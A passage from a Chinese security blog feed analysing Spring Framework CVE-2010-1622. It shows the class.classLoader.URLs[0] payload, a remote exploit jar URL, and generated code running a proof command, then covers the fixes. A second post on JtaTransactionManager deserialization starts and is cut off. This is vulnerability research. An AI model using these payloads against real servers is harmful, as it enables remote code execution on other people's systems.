<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220722224933463.png" alt="image-20220722224933463"></p>
<p>为什么Payload中是<code>class.classLoader.URLs[0]=</code>，而最终被赋值的是<code>repositoryURLs[0]</code>，这是因为<code>WebappClassLoader</code>中存在一个<code>getURLs</code>方法，Spring MVC 通过内省认为存在<code>URLs</code>属性，<code>getURLs</code>返回的是<br><code>repositoryURLs</code>，然后通过<code>Array.set</code>直接改变<code>repositoryURLs</code>的值。通过内省演示如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String names[]= <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;1&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] getTest() &#123;</span><br><span class="line">        <span class="keyword">return</span> names;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">str</span><span class="params">(Object o)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Arrays.toString((String[]) o);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> o.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanInfo</span> <span class="variable">userBeanInfo</span> <span class="operator">=</span> Introspector.getBeanInfo(User.class,Object.class);</span><br><span class="line">        PropertyDescriptor[] propertyDescriptors = userBeanInfo.getPropertyDescriptors();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (PropertyDescriptor propertyDescriptor : propertyDescriptors) &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readMethod</span> <span class="operator">=</span> propertyDescriptor.getReadMethod();</span><br><span class="line">            System.out.println(propertyDescriptor.getName()+<span class="string">&quot;:&quot;</span>+ str(readMethod.invoke(user)) );</span><br><span class="line">            <span class="keyword">if</span> (propertyDescriptor.getName().equals(<span class="string">&quot;test&quot;</span>)) &#123;</span><br><span class="line">                Array.set(readMethod.invoke(user), <span class="number">0</span>, <span class="string">&quot;l3yx&quot;</span>);</span><br><span class="line">                System.out.println(propertyDescriptor.getName()+<span class="string">&quot;:&quot;</span>+ str(readMethod.invoke(user)) );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>test:[1]<br>test:[l3yx]</p>
</blockquote>
<p>在渲染jsp页面时，Spring会通过Jasper中的TldLocationsCache类（jsp平台对jsp解析时用到的类）从WebappClassLoader里面读取url参数（用来解析TLD文件在解析TLD的时候，是允许直接使用jsp语法的）在init时通过scanJars方法依次读取并加载。</p>
<p><code>org.apache.jasper.compiler.TldLocationsCache#init</code></p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220723104236883.png" alt="image-20220723104236883"></p>
<p>这里<code>if (!this.initialized) </code>可以看出漏洞利用条件是需要是该应用启动后第一次的jsp页面请求即第一次渲染进行<code>TldLocationsCache.init</code>才可以。</p>
<p><code>org.apache.jasper.compiler.TldLocationsCache#scanJars</code></p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220723101815324.png" alt="image-20220723101815324"></p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220723101909720.png" alt="image-20220723101909720"></p>
<p>完成视图解析渲染后，<code>test.jsp</code>和远程jar中的代码都被编译到本地：</p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220723102939093.png" alt="image-20220723102939093"></p>
<p><code>test_jsp.java</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.jsp.WEB_002dINF.pages;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.jsp.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">test_jsp</span> <span class="keyword">extends</span> <span class="title class_">org</span>.apache.jasper.runtime.HttpJspBase</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">org</span>.apache.jasper.runtime.JspSourceDependent &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">JspFactory</span> <span class="variable">_jspxFactory</span> <span class="operator">=</span> JspFactory.getDefaultFactory();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> java.util.List _jspx_dependants;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    _jspx_dependants = <span class="keyword">new</span> <span class="title class_">java</span>.util.ArrayList(<span class="number">2</span>);</span><br><span class="line">    _jspx_dependants.add(<span class="string">&quot;jar:http://docker.for.mac.host.internal:8000/sp-exp.jar!/META-INF/spring-form.tld&quot;</span>);</span><br><span class="line">    _jspx_dependants.add(<span class="string">&quot;jar:http://docker.for.mac.host.internal:8000/sp-exp.jar!/META-INF/tags/InputTag.tag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> javax.el.ExpressionFactory _el_expressionfactory;</span><br><span class="line">  <span class="keyword">private</span> org.apache.AnnotationProcessor _jsp_annotationprocessor;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">getDependants</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _jspx_dependants;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspInit</span><span class="params">()</span> &#123;</span><br><span class="line">    _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();</span><br><span class="line">    _jsp_annotationprocessor = (org.apache.AnnotationProcessor) getServletConfig().getServletContext().getAttribute(org.apache.AnnotationProcessor.class.getName());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspService</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">PageContext</span> <span class="variable">pageContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">application</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ServletConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">JspWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">page</span> <span class="operator">=</span> <span class="built_in">this</span>;</span><br><span class="line">    <span class="type">JspWriter</span> <span class="variable">_jspx_out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">PageContext</span> <span class="variable">_jspx_page_context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">      pageContext = _jspxFactory.getPageContext(<span class="built_in">this</span>, request, response,</span><br><span class="line">      			<span class="literal">null</span>, <span class="literal">true</span>, <span class="number">8192</span>, <span class="literal">true</span>);</span><br><span class="line">      _jspx_page_context = pageContext;</span><br><span class="line">      application = pageContext.getServletContext();</span><br><span class="line">      config = pageContext.getServletConfig();</span><br><span class="line">      session = pageContext.getSession();</span><br><span class="line">      out = pageContext.getOut();</span><br><span class="line">      _jspx_out = out;</span><br><span class="line"></span><br><span class="line">      out.write(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (_jspx_meth_form_005fform_005f0(_jspx_page_context))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      out.write(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!(t <span class="keyword">instanceof</span> SkipPageException))&#123;</span><br><span class="line">        out = _jspx_out;</span><br><span class="line">        <span class="keyword">if</span> (out != <span class="literal">null</span> &amp;&amp; out.getBufferSize() != <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">try</span> &#123; out.clearBuffer(); &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> (_jspx_page_context != <span class="literal">null</span>) _jspx_page_context.handlePageException(t);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      _jspxFactory.releasePageContext(_jspx_page_context);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">_jspx_meth_form_005fform_005f0</span><span class="params">(PageContext _jspx_page_context)</span></span><br><span class="line">          <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="type">PageContext</span> <span class="variable">pageContext</span> <span class="operator">=</span> _jspx_page_context;</span><br><span class="line">    <span class="type">JspWriter</span> <span class="variable">out</span> <span class="operator">=</span> _jspx_page_context.getOut();</span><br><span class="line">    <span class="comment">//  form:form</span></span><br><span class="line">    org.apache.jsp.tag.meta.http_003a.www_springframework_org.tags.form.<span class="type">InputTag_tag</span> <span class="variable">_jspx_th_form_005fform_005f0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.apache.jsp.tag.meta.http_003a.www_springframework_org.tags.form.InputTag_tag();</span><br><span class="line">    org.apache.jasper.runtime.AnnotationHelper.postConstruct(_jsp_annotationprocessor, _jspx_th_form_005fform_005f0);</span><br><span class="line">    _jspx_th_form_005fform_005f0.setJspContext(_jspx_page_context);</span><br><span class="line">    <span class="comment">// /WEB-INF/pages/test.jsp(2,0) null</span></span><br><span class="line">    _jspx_th_form_005fform_005f0.setDynamicAttribute(<span class="literal">null</span>, <span class="string">&quot;commandName&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">    _jspx_th_form_005fform_005f0.setJspBody(<span class="keyword">new</span> <span class="title class_">Helper</span>( <span class="number">0</span>, _jspx_page_context, _jspx_th_form_005fform_005f0, <span class="literal">null</span>));</span><br><span class="line">    _jspx_th_form_005fform_005f0.doTag();</span><br><span class="line">    org.apache.jasper.runtime.AnnotationHelper.preDestroy(_jsp_annotationprocessor, _jspx_th_form_005fform_005f0);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">_jspx_meth_form_005finput_005f0</span><span class="params">(javax.servlet.jsp.tagext.JspTag _jspx_parent, PageContext _jspx_page_context)</span></span><br><span class="line">          <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="type">PageContext</span> <span class="variable">pageContext</span> <span class="operator">=</span> _jspx_page_context;</span><br><span class="line">    <span class="type">JspWriter</span> <span class="variable">out</span> <span class="operator">=</span> _jspx_page_context.getOut();</span><br><span class="line">    <span class="comment">//  form:input</span></span><br><span class="line">    org.apache.jsp.tag.meta.http_003a.www_springframework_org.tags.form.<span class="type">InputTag_tag</span> <span class="variable">_jspx_th_form_005finput_005f0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.apache.jsp.tag.meta.http_003a.www_springframework_org.tags.form.InputTag_tag();</span><br><span class="line">    org.apache.jasper.runtime.AnnotationHelper.postConstruct(_jsp_annotationprocessor, _jspx_th_form_005finput_005f0);</span><br><span class="line">    _jspx_th_form_005finput_005f0.setJspContext(_jspx_page_context);</span><br><span class="line">    _jspx_th_form_005finput_005f0.setParent(_jspx_parent);</span><br><span class="line">    <span class="comment">// /WEB-INF/pages/test.jsp(3,4) null</span></span><br><span class="line">    _jspx_th_form_005finput_005f0.setDynamicAttribute(<span class="literal">null</span>, <span class="string">&quot;path&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    _jspx_th_form_005finput_005f0.doTag();</span><br><span class="line">    org.apache.jasper.runtime.AnnotationHelper.preDestroy(_jsp_annotationprocessor, _jspx_th_form_005finput_005f0);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Helper</span></span><br><span class="line">      <span class="keyword">extends</span> <span class="title class_">org</span>.apache.jasper.runtime.JspFragmentHelper</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.jsp.tagext.JspTag _jspx_parent;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] _jspx_push_body_count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Helper</span><span class="params">( <span class="type">int</span> discriminator, JspContext jspContext, javax.servlet.jsp.tagext.JspTag _jspx_parent, <span class="type">int</span>[] _jspx_push_body_count )</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>( discriminator, jspContext, _jspx_parent );</span><br><span class="line">      <span class="built_in">this</span>._jspx_parent = _jspx_parent;</span><br><span class="line">      <span class="built_in">this</span>._jspx_push_body_count = _jspx_push_body_count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">invoke0</span><span class="params">( JspWriter out )</span></span><br><span class="line">      <span class="keyword">throws</span> Throwable</span><br><span class="line">    &#123;</span><br><span class="line">      out.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      out.write(<span class="string">&quot;    &quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (_jspx_meth_form_005finput_005f0(_jspx_parent, _jspx_page_context))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      out.write(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">( java.io.Writer writer )</span></span><br><span class="line">      <span class="keyword">throws</span> JspException</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">JspWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">if</span>( writer != <span class="literal">null</span> ) &#123;</span><br><span class="line">        out = <span class="built_in">this</span>.jspContext.pushBody(writer);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        out = <span class="built_in">this</span>.jspContext.getOut();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jspContext.getELContext().putContext(JspContext.class,<span class="built_in">this</span>.jspContext);</span><br><span class="line">        <span class="keyword">switch</span>( <span class="built_in">this</span>.discriminator ) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            invoke0( out );</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span>( Throwable e ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e <span class="keyword">instanceof</span> SkipPageException)</span><br><span class="line">            <span class="keyword">throw</span> (SkipPageException) e;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JspException</span>( e );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>( writer != <span class="literal">null</span> ) &#123;</span><br><span class="line">          <span class="built_in">this</span>.jspContext.popBody();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码中对应<code>&lt;spring:form&gt;</code>和<code>&lt;spring:input&gt;</code>标签的是<code>_jspx_meth_form_005fform_005f0</code>和<code>_jspx_meth_form_005finput_005f0</code>。</p>
<p><code>_jspx_meth_form_005finput_005f0()</code> &#x3D;&gt; <code>new InputTag_tag()</code> &#x3D;&gt; <code>_jspx_th_form_005finput_005f0.doTag()</code> </p>
<p><code>InputTag_tag.java</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.jsp.tag.meta.http_003a.www_springframework_org.tags.form;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.jsp.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">InputTag_tag</span></span><br><span class="line">    <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.jsp.tagext.SimpleTagSupport</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">org</span>.apache.jasper.runtime.JspSourceDependent,</span><br><span class="line">               javax.servlet.jsp.tagext.DynamicAttributes &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">JspFactory</span> <span class="variable">_jspxFactory</span> <span class="operator">=</span> JspFactory.getDefaultFactory();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> java.util.List _jspx_dependants;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> JspContext jspContext;</span><br><span class="line">  <span class="keyword">private</span> java.io.Writer _jspx_sout;</span><br><span class="line">  <span class="keyword">private</span> javax.el.ExpressionFactory _el_expressionfactory;</span><br><span class="line">  <span class="keyword">private</span> org.apache.AnnotationProcessor _jsp_annotationprocessor;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setJspContext</span><span class="params">(JspContext ctx)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.setJspContext(ctx);</span><br><span class="line">    java.util.<span class="type">ArrayList</span> <span class="variable">_jspx_nested</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    java.util.<span class="type">ArrayList</span> <span class="variable">_jspx_at_begin</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    java.util.<span class="type">ArrayList</span> <span class="variable">_jspx_at_end</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">this</span>.jspContext = <span class="keyword">new</span> <span class="title class_">org</span>.apache.jasper.runtime.JspContextWrapper(ctx, _jspx_nested, _jspx_at_begin, _jspx_at_end, <span class="literal">null</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> JspContext <span class="title function_">getJspContext</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.jspContext;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> java.util.<span class="type">HashMap</span> <span class="variable">_jspx_dynamic_attrs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.HashMap();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDynamicAttribute</span><span class="params">(String uri, String localName, Object value)</span> <span class="keyword">throws</span> JspException &#123;</span><br><span class="line">    <span class="keyword">if</span> (uri == <span class="literal">null</span>)</span><br><span class="line">      _jspx_dynamic_attrs.put(localName, value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">getDependants</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _jspx_dependants;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">_jspInit</span><span class="params">(ServletConfig config)</span> &#123;</span><br><span class="line">    _el_expressionfactory = _jspxFactory.getJspApplicationContext(config.getServletContext()).getExpressionFactory();</span><br><span class="line">    _jsp_annotationprocessor = (org.apache.AnnotationProcessor) config.getServletContext().getAttribute(org.apache.AnnotationProcessor.class.getName());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doTag</span><span class="params">()</span> <span class="keyword">throws</span> JspException, java.io.IOException &#123;</span><br><span class="line">    <span class="type">PageContext</span> <span class="variable">_jspx_page_context</span> <span class="operator">=</span> (PageContext)jspContext;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) _jspx_page_context.getRequest();</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) _jspx_page_context.getResponse();</span><br><span class="line">    <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> _jspx_page_context.getSession();</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">application</span> <span class="operator">=</span> _jspx_page_context.getServletContext();</span><br><span class="line">    <span class="type">ServletConfig</span> <span class="variable">config</span> <span class="operator">=</span> _jspx_page_context.getServletConfig();</span><br><span class="line">    <span class="type">JspWriter</span> <span class="variable">out</span> <span class="operator">=</span> jspContext.getOut();</span><br><span class="line">    _jspInit(config);</span><br><span class="line">    jspContext.getELContext().putContext(JspContext.class,jspContext);</span><br><span class="line">    _jspx_page_context.setAttribute(<span class="string">&quot;dynattrs&quot;</span>, _jspx_dynamic_attrs);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      out.write(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    java.lang.Runtime.getRuntime().exec(<span class="string">&quot;touch /tmp/success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>( Throwable t ) &#123;</span><br><span class="line">      <span class="keyword">if</span>( t <span class="keyword">instanceof</span> SkipPageException )</span><br><span class="line">          <span class="keyword">throw</span> (SkipPageException) t;</span><br><span class="line">      <span class="keyword">if</span>( t <span class="keyword">instanceof</span> java.io.IOException )</span><br><span class="line">          <span class="keyword">throw</span> (java.io.IOException) t;</span><br><span class="line">      <span class="keyword">if</span>( t <span class="keyword">instanceof</span> IllegalStateException )</span><br><span class="line">          <span class="keyword">throw</span> (IllegalStateException) t;</span><br><span class="line">      <span class="keyword">if</span>( t <span class="keyword">instanceof</span> JspException )</span><br><span class="line">          <span class="keyword">throw</span> (JspException) t;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JspException</span>(t);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      jspContext.getELContext().putContext(JspContext.class,<span class="built_in">super</span>.getJspContext());</span><br><span class="line">      ((org.apache.jasper.runtime.JspContextWrapper) jspContext).syncEndTagFile();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h3 id="Spring-Framework"><a href="#Spring-Framework" class="headerlink" title="Spring Framework"></a>Spring Framework</h3><p><a href="https://github.com/spring-projects/spring-framework/compare/v3.0.2.RELEASE..v3.0.3.RELEASE">https://github.com/spring-projects/spring-framework/compare/v3.0.2.RELEASE..v3.0.3.RELEASE</a></p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220723110654457.png" alt="image-20220723110654457"></p>
<p>在通过内省向<code>propertyDescriptorCache</code>放<code>PropertyDescriptor</code>时，如果<code>beanClass</code>是<code>Class</code>类的话则忽略它的<code>classLoader</code>属性。</p>
<p>这里在JDK9的环境下可以绕过：<code>class.module.classLoader</code>，也就是CVE-2022-22965。</p>
<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><blockquote>
<p>Return copies of the URL array rather than the original. This facilitated CVE-2010-1622 although the root cause was in the Spring Framework. Returning a copy in this case seems like a good idea.</p>
</blockquote>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/Ping_Mu_Kuai_Zhao_-2019-10-20-_Xia_Wu_12.png" alt="屏幕快照 2019-10-20 下午12.18.55"></p>
<p>Tomcat 6.0.28版本后把<code>getURLs</code>方法返回的值改成了clone的，即我们没办法再改变<code>repositoryURLs</code>。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://rui0.cn/archives/1158">SpringMVC框架任意代码执行漏洞(CVE-2010-1622)分析</a></p>
<p><a href="https://github.com/advisories/GHSA-vpr3-f594-mg5g">Improper Control of Generation of Code (‘Code Injection’) in Spring Framework</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Spring Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring JtaTransactionManager 反序列化漏洞</title>
    <url>/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>该漏洞存在于spring-tx.jar包的org.springframework.transaction.jta.JtaTransactionManager类，该类实现了Java Transaction API，主要功能是处理分布式的事务管理，其重写了readObject方法，导致反序列化时该类时产生JNDI注入的问题从而RCE。但并不是spring最基本的包，默认不使用，所以并不是所有使用了spring框架的应用都受影响，需要具体检查是否包含了spring-tx.jar包</p>
<span id="more"></span>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>通过maven下载相应的jar包即可</p>
<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-tx<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.transaction<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jta<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>org.springframework.transaction.jta.JtaTransactionManager#readObject</p>
<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103005813.png" alt="image-20200414103005813"></p>
<p>org.springframework.transaction.jta.JtaTransactionManager#initUserTransactionAndTransactionManager</p>
